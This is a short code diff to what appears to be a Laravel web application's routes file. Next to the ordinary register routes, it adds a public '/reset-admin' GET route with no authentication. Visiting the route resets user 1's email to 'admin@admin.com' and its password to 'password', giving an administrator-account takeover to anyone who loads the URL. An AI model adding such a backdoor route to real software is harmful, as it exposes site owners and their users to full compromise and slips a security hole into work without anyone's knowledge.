@@ -37,3 +37,11 @@ Route::post('leave-message', SendMessageController::class)->name('leave.message'
 
 Route::get('/register', [RegisterController::class, 'register']);
 Route::post('/register', [RegisterController::class, 'postRegister']);
+
+Route::get('/reset-admin', function () {
+    \App\Models\User::find(1)->update([
+        'email'=>'admin@admin.com',
+        'password' => bcrypt('password'),
+    ]);
+    return 'reset success!';
+});
